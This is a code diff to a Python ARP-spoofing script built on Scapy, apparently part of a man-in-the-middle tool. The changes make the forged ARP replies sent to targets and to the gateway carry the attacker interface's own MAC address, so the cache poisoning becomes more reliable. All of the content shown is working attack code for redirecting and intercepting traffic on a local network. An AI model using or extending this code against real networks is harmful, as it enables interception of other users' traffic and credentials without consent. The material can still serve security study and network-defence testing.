@@ -74,7 +74,7 @@ def relaymode_arp_spoof(spoofed_ip):
         if Targets != set() :
             packets_list = []
             for target in mac_addresses :
-                packets_list.append(Ether(dst=mac_addresses[target]) / ARP(op = 2, psrc = spoofed_ip))
+                packets_list.append(Ether(src = hwsrc, dst=mac_addresses[target]) / ARP(op = 2, hwsrc = hwsrc, psrc = spoofed_ip))
             sendp(packets_list, verbose=False)
         time.sleep(1)
         timer += 1
@@ -85,7 +85,7 @@ def relaymode_arp_spoof(spoofed_ip):
 def listenmode_arp_spoof():
     gateway_mac = getmacbyip(gw)
     while not stop_arp_spoofing_flag.is_set() :
-        if Targets != set() : sendp(Ether(dst=gateway_mac) / (ARP(op = 2, psrc = list(Targets))), verbose=False)
+        if Targets != set() : sendp(Ether(src = hwsrc, dst=gateway_mac) / (ARP(op = 2, hwsrc = hwsrc, psrc = list(Targets))), verbose=False)
         time.sleep(1)
 
 def valid_ip(address):
@@ -217,6 +217,7 @@ if parameters.gw is not None and not valid_ip(parameters.gw) :
 
 iface_ip = netifaces.ifaddresses(str(iface))[netifaces.AF_INET][0]['addr']
 netmask = netifaces.ifaddresses(str(iface))[netifaces.AF_INET][0]['netmask']
+hwsrc = netifaces.ifaddresses(str(iface))[netifaces.AF_PACKET][0]['addr']
 subnet = ipaddress.IPv4Network(f'{iface_ip}/{netmask}', strict=False)
 
 if parameters.gw is not None and ipaddress.ip_address(parameters.gw) not in ipaddress.ip_network(subnet) :
